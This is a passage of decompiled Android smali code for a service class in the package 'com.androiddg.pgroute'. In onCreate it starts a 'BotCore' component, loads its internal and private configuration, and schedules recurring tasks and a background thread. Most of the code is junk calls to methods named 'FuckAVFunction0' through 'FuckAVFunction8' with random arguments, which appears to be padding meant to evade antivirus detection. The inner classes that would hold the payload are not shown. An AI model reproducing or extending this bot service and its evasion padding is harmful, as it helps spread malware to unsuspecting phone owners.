
    const-string v3, "WKlpClrj"

    const-string v4, "oFPiF"

    const v5, 0x316497bd

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 214
    new-instance v7, Lcom/androiddg/pgroute/BotCore;

    iget-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR;->settings:Landroid/content/SharedPreferences;

    invoke-direct {v7, p0, v0}, Lcom/androiddg/pgroute/BotCore;-><init>(Landroid/content/Context;Landroid/content/SharedPreferences;)V

    .line 215
    .local v7, "botCore":Lcom/androiddg/pgroute/BotCore;
    const-string v0, "TwaFwLJ"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "kocwcN"

    const-string v3, "bUKUWO"

    const v4, 0xb9b81ed

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x1759bf3

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 216
    const-string v0, "qVTgcD"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0xae13eb0

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x3842e984

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "oRHgqN"

    const v5, 0x2a8ea7b5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "FNDLLi"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 217
    const-string v0, "SQbKKSvhlK"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x343dcf9e

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x99f02af

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "KCSvdWdACE"

    const v5, 0x2bb47c04

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "IdWlljK"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 218
    invoke-virtual {v7}, Lcom/androiddg/pgroute/BotCore;->loadInternalConfig()V

    .line 219
    const-string v0, "KdlIlhhAj"

    const-string v1, "iuoaaigscm"

    const-string v2, "QUElKA"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "bUWpItnE"

    const v5, 0x2dcec894

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction3(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 220
    const-string v0, "tIWUjdfrW"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x1d3c2f9a

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "sooPcBL"

    const-string v4, "IEnEjb"

    const v5, 0xc774c26

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 221
    const-string v0, "rrWnp"

    const-string v1, "VPaqii"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 222
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "EnnIAlhv"

    const-string v2, "amsePg"

    const-string v3, "AUQjUEvW"

    const-string v4, "VPwDFFk"

    const-string v5, "lSbtAnGM"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 223
    invoke-virtual {v7}, Lcom/androiddg/pgroute/BotCore;->readPrivateConfig()V

    .line 224
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "GMIvUEhAE"

    const-string v2, "sgeVHR"

    const-string v3, "nEhShlr"

    const-string v4, "euDsws"

    const-string v5, "ISSrEGIQS"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 225
    const v0, 0x6b8c0fa

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "OlAlCO"

    const-string v2, "sVBHow"

    const-string v3, "tbbQGrl"

    const-string v4, "HHBgawJ"

    const-string v5, "lUfpQW"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction5(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 226
    const-string v0, "TugDuume"

    const-string v1, "EGtAEh"

    const-string v2, "BaaLFg"

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 228
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 230
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadScheduledExecutor()Ljava/util/concurrent/ScheduledExecutorService;

    move-result-object v9

    .line 231
    .local v9, "scheduler":Ljava/util/concurrent/ScheduledExecutorService;
    const-string v0, "EAWjQhtC"

    const-string v1, "kJguVePqH"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 232
    const-string v0, "THkTaTkiHsT"

    const-string v1, "IjpQSndh"

    const-string v2, "RoqNowa"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "kNmok"

    const v5, 0x17b850a6

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction3(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 233
    const-string v0, "cBBwFi"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "qRiuJL"

    const-string v3, "GjOWIQ"

    const v4, 0x196175a4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x17d175e3

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 234
    new-instance v1, Lcom/androiddg/pgroute/oRwHoDwR$1;

    invoke-direct {v1, p0}, Lcom/androiddg/pgroute/oRwHoDwR$1;-><init>(Lcom/androiddg/pgroute/oRwHoDwR;)V

    const-wide/16 v4, 0x1518

    sget-object v6, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    move-object v0, v9

    move-wide v2, v12

    invoke-interface/range {v0 .. v6}, Ljava/util/concurrent/ScheduledExecutorService;->scheduleAtFixedRate(Ljava/lang/Runnable;JJLjava/util/concurrent/TimeUnit;)Ljava/util/concurrent/ScheduledFuture;

    .line 257
    const-string v0, "hffCOSl"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2be82c1e

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "mqJDNo"

    const-string v4, "pndjlf"

    const v5, 0x1f982481

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 258
    const v0, 0x171aec50

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "LVPiwDsLLP"

    const-string v2, "pElblb"

    const-string v3, "oBNLqNoRsa"

    const-string v4, "EjljbMfpA"

    const-string v5, "FoHue"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction5(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 259
    const-string v0, "rSfdMWE"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "WfAOl"

    const-string v3, "wTDHeeLR"

    const v4, 0x3320d443

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0xb36ecfa

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 260
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "JJTwcsoRJB"

    const-string v2, "OnvMMGOC"

    const-string v3, "uFNTFVRmq"

    const-string v4, "SUvApbM"

    const-string v5, "VoawqaR"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 262
    new-instance v1, Lcom/androiddg/pgroute/oRwHoDwR$2;

    invoke-direct {v1, p0}, Lcom/androiddg/pgroute/oRwHoDwR$2;-><init>(Lcom/androiddg/pgroute/oRwHoDwR;)V

    const-wide/16 v4, 0x96

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    move-object v0, v9

    move-wide v2, v12

    invoke-interface/range {v0 .. v6}, Ljava/util/concurrent/ScheduledExecutorService;->scheduleAtFixedRate(Ljava/lang/Runnable;JJLjava/util/concurrent/TimeUnit;)Ljava/util/concurrent/ScheduledFuture;

    .line 309
    const-string v0, "KjMbrhWE"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "vEMlpQOG"

    const-string v3, "ueDiNsHRBk"

    const v4, 0x2a318617

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x23b0cd24

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 310
    const-string v0, "GGdAhjS"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x963df42

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "BcVcVwe"

    const-string v4, "SKnplbMrIvGQ"

    const v5, 0x32f762be

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 311
    const-string v0, "nfIfMvf"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x1344633a

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "TDccsTe"

    const-string v4, "CEQGMEQnj"

    const v5, 0x179298cb

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 313
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/androiddg/pgroute/oRwHoDwR$3;

    invoke-direct {v1, p0}, Lcom/androiddg/pgroute/oRwHoDwR$3;-><init>(Lcom/androiddg/pgroute/oRwHoDwR;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 344
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 345
    const-string v0, "GClChWUpp"

    const-string v1, "RTReVgw"

    const v2, 0x1d24e732

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "oLgcwq"

    const-string v4, "vjftUn"

    const-string v5, "ikVmT"

    const-string v6, "SOhlCt"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction1(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 346
    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "AthSQfEGj"

    const-string v2, "cmJggFuJ"

    const-string v3, "WEKGtSSf"

    const-string v4, "aDBmkeN"

    const-string v5, "flCfQfjIS"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 347
    const-string v0, "kJBFBH"

    const-string v1, "QQpCEGO"

    const-string v2, "oRaaDgeHBL"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "ueFVFBH"

    const v5, 0x1f89b50d

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction3(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 348
    const-string v0, "eLNuuom"

    const-string v1, "MGUjSt"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 350
    return-void
.end method

.method public onDestroy()V
    .locals 9

    .prologue
    const/4 v8, 0x0

    const/4 v7, 0x1

    .line 414
    const-string v0, "pAOjd"

    const-string v1, "DNJuL"

    const-string v2, "MIOlUrd"

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 415
    const-string v0, "aPiqiTko"

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "gqiacPB"

    const-string v3, "UtQrKMvtOW"

    const v4, 0x239e2cd1

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x28b85787

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 416
    const-string v0, "TVgNueso"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x32b72006

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x641147f

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "PPRBqmVHk"

    const v5, 0x6989f9e

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "iLqwNq"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 417
    const-string v0, "IWbvrAO"

    const-string v1, "Nqciuu"

    const-string v2, "tfSjKG"

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 419
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 420
    iget-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 421
    const-string v0, "eugHJeH"

    const-string v1, "KIEdKKM"

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 422
    sput-boolean v8, Lcom/androiddg/pgroute/oRwHoDwR;->isRunning:Z

    .line 423
    const-string v0, "mLwuHLi"

    const-string v1, "bjQbQUA"

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 424
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "RVcmN"

    const-string v2, "GdtnnUlUM"

    const-string v3, "cToLR"

    const-string v4, "rjCMpIOlC"

    const-string v5, "PiuuDFeN"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 425
    const-string v0, "GtpbWC"

    const-string v1, "HLeLcigTPac"

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 426
    const-string v0, "mNLcmN"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2caef7d

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x340f3ecf

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "eTNkHu"

    const v5, 0x2b41e4a

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "uRTFL"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 427
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 6
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    .line 409
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "UIAObUSd"

    const-string v2, "PmoisV"

    const-string v3, "SjrMUj"

    const-string v4, "eHuwqcHwL"

    const-string v5, "IMIWrpEQG"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 410
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method
